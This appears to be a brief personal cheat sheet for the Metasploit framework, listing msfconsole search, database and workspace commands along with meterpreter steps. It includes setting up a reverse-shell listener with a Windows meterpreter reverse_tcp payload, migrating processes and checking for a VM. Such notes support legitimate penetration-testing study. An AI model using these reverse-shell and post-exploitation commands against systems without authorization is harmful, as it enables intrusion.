# Metasploit Notes

## General Usage
__Basics__
----
```msfconsole
# Search metasploit's db for exploits
search <keyword>

# Get context-specific variable
get <var>

# Set global variable
setg <var>

# Unset context-specific variable
unset <var>

# store nmap scan in database
db_nmap <options> <host>

# list open services on target
services

# list host info in database
hosts

# list vulns
vulns

# edit exploit source code
edit
```
```meterpreter (windows)
# migrate to another process
migrate <PID>

# check if target is a VM
run post/windows/gather/checkvm

# setup msfvenom reverse shell payload listener
# don't forget to set LHOST and LPORT	
use exploit/multi/handler

# setup windows meterpreter reverse shell
set payload windows/meterpreter/reverse_tcp
run
```
__Project Management__
```bash
systemctl start postgresql  # start postgres database
msfdb init                  # create metasploit database
```
```msfconsole
db_status   # connect to db
workspace   # setup workspace
```

## Meterpreter
`getpid`: get meterpreter shell pid

## Useful Modules
`exploit/multi/handler/reverse_tcp`

